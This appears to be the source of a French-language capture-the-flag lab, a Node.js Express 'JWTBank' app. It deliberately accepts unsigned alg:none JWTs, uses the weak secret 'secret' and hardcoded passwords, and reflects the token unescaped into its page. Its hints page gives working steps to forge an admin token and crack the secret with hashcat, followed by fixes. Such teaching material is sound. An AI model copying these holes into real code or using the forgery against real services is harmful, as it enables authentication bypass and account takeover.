'use strict';
// VulnLab C10 — JWT Forgery
// VULNÉRABILITÉS : accepte alg:none, secret faible crackable
const express      = require('express');
const cookieParser = require('cookie-parser');
const jwt          = require('jsonwebtoken');
const app          = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

// ⚠️  Secret JWT faible — dans rockyou.txt
const JWT_SECRET = 'secret';

const USERS = {
  alice: { password: 'alice123', role: 'user'  },
  admin: { password: 'adm1n!',   role: 'admin' },
};

const css = `<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',sans-serif;background:#0f1117;color:#c8d0dc;min-height:100vh;padding:40px 24px}
.wrap{max-width:820px;margin:0 auto}h1{font-size:22px;color:#e4e8f0;margin-bottom:6px}
.sub{font-size:13px;color:#5a6475;font-family:monospace;margin-bottom:28px}
.card{background:#151a22;border:1px solid rgba(255,255,255,.07);border-radius:10px;padding:22px;margin-bottom:16px}
.card h3{font-size:13px;font-weight:600;text-transform:uppercase;letter-spacing:.08em;color:#5a6475;margin-bottom:14px}
input{width:100%;padding:9px 13px;background:#0f1117;border:1px solid rgba(255,255,255,.1);border-radius:8px;color:#e4e8f0;font-size:13px;font-family:monospace;outline:none;margin-bottom:10px}
input:focus{border-color:#5a6475}
.btn{padding:9px 20px;background:#2d6ef7;color:#fff;border:none;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer}
.code{background:#1e1e2e;border-radius:8px;padding:14px;font-family:monospace;font-size:12px;color:#cdd6f4;line-height:1.9;word-break:break-all}
.lbl{font-size:10px;color:#6c7086;text-transform:uppercase;letter-spacing:.08em;margin-bottom:6px}
.ok{background:#0f2a0f;border:1px solid #2d6b2d;border-radius:8px;padding:14px;font-size:13px;color:#86efac;font-family:monospace;line-height:1.8}
.err{background:#2a0f0f;border:1px solid #6b2d2d;border-radius:8px;padding:14px;font-size:13px;color:#f38ba8}
.flag-val{font-size:15px;font-weight:700;color:#86efac}
a{color:#4a9eff;font-size:13px;text-decoration:none;display:inline-block;margin-top:8px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
@media(max-width:700px){.grid{grid-template-columns:1fr}}
</style>`;

// ── Helpers ──────────────────────────────────

function verifyToken(token) {
  if (!token) return null;
  try {
    // ⚠️  VULNÉRABILITÉ 1 : algorithms non restreint → accepte 'none'
    const decoded = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256', 'none'] });
    return decoded;
  } catch (e) {
    // ⚠️  VULNÉRABILITÉ 2 : fallback manuel pour alg:none (pas de signature vérifiée)
    try {
      const parts  = token.split('.');
      if (parts.length === 3) {
        const header  = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
        if (header.alg === 'none') {
          return JSON.parse(Buffer.from(parts[1], 'base64url').toString());
        }
      }
    } catch (_) {}
    return null;
  }
}

// ── Routes ───────────────────────────────────

app.get('/', (req, res) => {
  const token   = req.cookies.token || req.query.token || '';
  const decoded = verifyToken(token);

  let statusHtml = '';
  if (decoded) {
    const isAdmin = decoded.role === 'admin';
    statusHtml = `
      <div class="${isAdmin ? 'ok' : 'card'}">
        <div class="lbl">Token décodé</div>
        username : ${decoded.username || '?'}<br>
        role     : <strong style="color:${isAdmin?'#a6e3a1':'#89dceb'}">${decoded.role || '?'}</strong><br>
        iat      : ${decoded.iat || '?'}
        ${isAdmin ? `<br><br><span class="flag-val">FLAG{jwt_4lg_n0n3_4nd_w34k_s3cr3t}</span>` : ''}
      </div>`;
  } else if (token) {
    statusHtml = `<div class="err">Token invalide ou expiré.</div>`;
  }

  res.send(`<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8">
<title>JWTBank</title>${css}</head><body><div class="wrap">
<h1>JWTBank — API Auth</h1>
<p class="sub">JWT HS256 · secret faible · alg:none accepté</p>

${statusHtml}

<div class="grid">
<div class="card"><h3>Obtenir un token (login)</h3>
<form method="POST" action="login">
  <input name="username" placeholder="alice ou admin">
  <input type="password" name="password" placeholder="mot de passe">
  <button type="submit" class="btn">Login →</button>
</form></div>

<div class="card"><h3>Tester un token</h3>
<form method="GET" action="./">
  <input name="token" placeholder="Collez votre JWT ici…" value="${token}">
  <button type="submit" class="btn">Vérifier →</button>
</form></div>
</div>

<div class="card">
<h3>Debug — Token actuel</h3>
<div class="code">
<div class="lbl">Token brut (cookie/query)</div>
${token || '(aucun)'}
${token ? `\n\n<div class="lbl">Header décodé</div>${(() => { try { return JSON.stringify(JSON.parse(Buffer.from(token.split('.')[0], 'base64url').toString()), null, 2); } catch(e){ return 'invalide'; } })()}

<div class="lbl">Payload décodé</div>${(() => { try { return JSON.stringify(JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString()), null, 2); } catch(e){ return 'invalide'; } })()} ` : ''}
</div>
</div>

<a href="hints">Hints &amp; Write-up →</a>
</div></body></html>`);
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = USERS[username];
  if (!user || user.password !== password) {
    return res.redirect('/?error=1');
  }
  // ⚠️  Secret faible 'secret'
  const token = jwt.sign({ username, role: user.role }, JWT_SECRET, {
    algorithm: 'HS256', expiresIn: '1h'
  });
  res.cookie('token', token, { httpOnly: false }); // ⚠️ pas HttpOnly
  res.redirect(`/?token=${token}`);
});

app.get('/hints', (req, res) => {
  res.send(`<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8">
<title>C10 Hints</title>${css}</head><body><div class="wrap">
<a href="/" style="margin-bottom:20px">← Retour</a>
<h1 style="margin-top:16px">C10 — JWT Forgery</h1>
<p class="sub">Node.js · jsonwebtoken · alg:none · secret faible</p>

<div class="card"><div class="lbl l1" style="color:#16a34a">Vuln 1 — alg:none (pas de signature)</div>
<p style="font-size:14px;color:#8a94a6;margin:10px 0;line-height:1.7">
Forgez un JWT avec <code>alg:none</code> — aucune signature requise, rôle admin injecté.</p>
<div class="code">import base64, json

header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"username":"hacker","role":"admin","iat":1700000000}).encode()).rstrip(b'=').decode()
token   = f"{header}.{payload}."   # signature vide

print(token)
# Coller dans le champ "Tester un token" ou via curl :
curl "http://localhost/c10/?token={token}"</div></div>

<div class="card"><div class="lbl" style="color:#d97706">Vuln 2 — Secret faible (crackable)</div>
<div class="code"># Connectez-vous avec alice/alice123 pour obtenir un token HS256
# Puis craquer le secret :
hashcat -a 0 -m 16500 alice.jwt /usr/share/wordlists/rockyou.txt
# → secret trouvé : "secret"

# Forger un nouveau token avec role:admin :
import jwt
forged = jwt.encode({"username":"hacker","role":"admin"}, "secret", algorithm="HS256")
print(forged)</div></div>

<div class="card"><div class="lbl" style="color:#dc2626">Flag</div>
<div class="code">FLAG{jwt_4lg_n0n3_4nd_w34k_s3cr3t}

# ✅ Corrections :
jwt.verify(token, secret, { algorithms: ['HS256'] }) // whitelist algos
const JWT_SECRET = crypto.randomBytes(64).toString('hex') // secret fort</div></div>
</div></body></html>`);
});

app.listen(3000, () => console.log('[C10-JWT] port 3000'));
